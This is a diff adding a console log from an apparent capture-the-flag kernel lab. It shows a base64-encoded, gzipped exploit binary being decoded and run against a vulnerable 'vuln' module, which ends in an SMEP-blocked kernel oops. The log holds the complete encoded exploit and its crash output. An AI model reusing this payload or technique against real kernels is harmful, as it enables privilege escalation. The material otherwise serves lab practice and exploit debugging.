@@ -1,0 +1,68 @@
+[    3.810777] 9pnet_virtio: no channels available for device hostshare
+mount: mounting hostshare on /home/ctf failed: No such file or directory
+[    3.837553] Module successfuly initialized
+-sh: can't access tty; job control turned off
+~ $ base64 -d | gunzip > attack
+H4sIAMZQj2EA/+2az2sbRxTHx5bktKYg+5SWlkqmMQmhlqJgWkNNMYHEKpTcCrmtR7uzlerVrphd
++QeU1j30YOxD/oAWcsy5vQgfZN3s0kNdH3MoBV+S9uRDf5wqz5t5Y8+urZ56CHQ+IL2Z73tvZme1
+EszTfHn/4wfjY2NEM04+JLI3tST76p2QpzfOQ4S2QHLi/RqZkLH5C5eRoexz7GlLppSBvILR1/Np
++xAvSVszbwIaZdTLmIe2hPJWJs9isVgsFovFYrFYLJb/M7WBv3tY387PlsUG2t89guYt0fzmEbTu
+iFZvXITV9/UGuw/dYqH+9WBjDUIWIAQ22fWdRdnpw858b11QLNQGWq33l3CAvSdqgJ387AAcYoyV
+GWEP8rMdYZ+JAkAPNu8Xmb+mM6V3X4b039AuqAkI16J2qQmOIH9u+eSkVy8MvjrsDcX6DrKOrS/A
+URz7ezgvl/4ZEQ1YuTBwV5rz0yL4p9qgdlz74a/T3//pfSDvyDTOXfuzdlwsvGDD4dA+TxaLxWKx
+WCwWi8VieTmpdnjkVjvroeOxtZbLSLXRCqtxkzDOIz75r7k5+Dde/2+f0kWNQP8vn9JzBDbUJur8
+wOmlnfNr8v10KDfnxs76bdTlbt7Q30cdtvSm/hHqUDow+USPn9GbqD/O6J+PGGd7xDjfjhjnO1z1
+95n71kMdyh8mP6J+V9QgTH5GHWoTJr/gKY7s/f8NdV200PyBui6kpD4YoZcyelHqlz/H66hDAcWk
+hDrUU0xuow4VHpM51HW1SPMe6roWpFmGR/CK5/Ce1HOXrh/Ok0xdsa5JjN8SJagUNEmou1qhcZu4
+UbvdShyXMy92qOdx0uGsQzlzVhkPWSA9yhFzRj2Hs6TLQ6VIgbajbpiotktDyjedyPdjhpKIh1it
+rfNWwnSO6qSTlJbJkl9c4tIgEBfj86jttCOvGzDSoWHLJQHthm7TiZssCIj6zjt+S7iloppyCCdh
+GziabDos9EhM18RFxMrGaP2AfhoT31OLaHR9MdVmEGHbcRpx7MQJ5QlxmEcTSkgl3mwntCFswpVt
+6pactSLDKiLxv/qde9M8O5Q6b5Q5ZzTi2NAM5ue0cH7uCJ/zTHz6TBQhN8XrFSNff39KmL+SmT+b
+D26ovGYp63NQODCcqXoL5wJeR/uqee1m/jv4e5iZP9Ml0yPyu3gu7N0rrtfkDKJD89toJgAA
+~ $ chmod +x attack
+~ $ ./attack
+[   28.399433] Device opened
+[   28.401319] IOCTL Called
+[   28.401598] 160 bytes read from device
+[   28.401866] 160 bytes written to device
+[   28.403027] unable to execute userspace code (SMEP?) (uid: 1000)
+[   28.403438] BUG: unable to handle page fault for address: 00000000004010da
+[   28.403649] #PF: supervisor instruction fetch in kernel mode
+[   28.403821] #PF: error_code(0x0011) - permissions violation
+[   28.404214] PGD 8000000001e2f067 P4D 8000000001e2f067 PUD 3836067 PMD 3837065
+[   28.404841] Oops: 0011 [#1] SMP PTI
+[   28.405241] CPU: 0 PID: 100 Comm: attack Tainted: G           O      5.4.0 #1
+[   28.405423] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.134
+[   28.406023] RIP: 0010:0x4010da
+[   28.406322] Code: 00 0f 05 b8 01 00 00 00 bf 01 00 00 00 48 be 19 20 40 00 00
+[   28.406801] RSP: 0018:ffffa213c01afeb8 EFLAGS: 00000282
+[   28.406962] RAX: 00000000000000a0 RBX: 0000000000000000 RCX: 0000000000000000
+[   28.407148] RDX: 0000000000000000 RSI: 0000000000000082 RDI: ffffffffa83120ec
+[   28.407357] RBP: ffff88dc401a19c0 R08: 6574796220303631 R09: 000000000000016f
+[   28.407540] R10: 74206e6574746972 R11: 656369766564206f R12: fffffffffffffffb
+[   28.407734] R13: ffffa213c01aff08 R14: 00000000004020e0 R15: 0000000000000000
+[   28.408140] FS:  0000000000000000(0000) GS:ffff88dc43800000(0000) knlGS:00000
+[   28.408511] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   28.408668] CR2: 00000000004010da CR3: 0000000001e2c000 CR4: 00000000003006f0
+[   28.409030] Call Trace:
+[   28.410858]  ? vfs_write+0xb1/0x190
+[   28.411034]  ? ksys_write+0x5a/0xd0
+[   28.411138]  ? do_syscall_64+0x43/0x110
+[   28.411247]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[   28.411466] Modules linked in: vuln(O)
+[   28.411833] CR2: 00000000004010da
+[   28.412195] ---[ end trace 61c38da65fb3b268 ]---
+[   28.412348] RIP: 0010:0x4010da
+[   28.412436] Code: 00 0f 05 b8 01 00 00 00 bf 01 00 00 00 48 be 19 20 40 00 00
+[   28.412846] RSP: 0018:ffffa213c01afeb8 EFLAGS: 00000282
+[   28.412972] RAX: 00000000000000a0 RBX: 0000000000000000 RCX: 0000000000000000
+[   28.413134] RDX: 0000000000000000 RSI: 0000000000000082 RDI: ffffffffa83120ec
+[   28.413294] RBP: ffff88dc401a19c0 R08: 6574796220303631 R09: 000000000000016f
+[   28.413499] R10: 74206e6574746972 R11: 656369766564206f R12: fffffffffffffffb
+[   28.413683] R13: ffffa213c01aff08 R14: 00000000004020e0 R15: 0000000000000000
+[   28.413859] FS:  0000000000000000(0000) GS:ffff88dc43800000(0000) knlGS:00000
+[   28.414056] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   28.414236] CR2: 00000000004010da CR3: 0000000001e2c000 CR4: 00000000003006f0
+[   28.414901] All device's closed
+Killed
+~ $
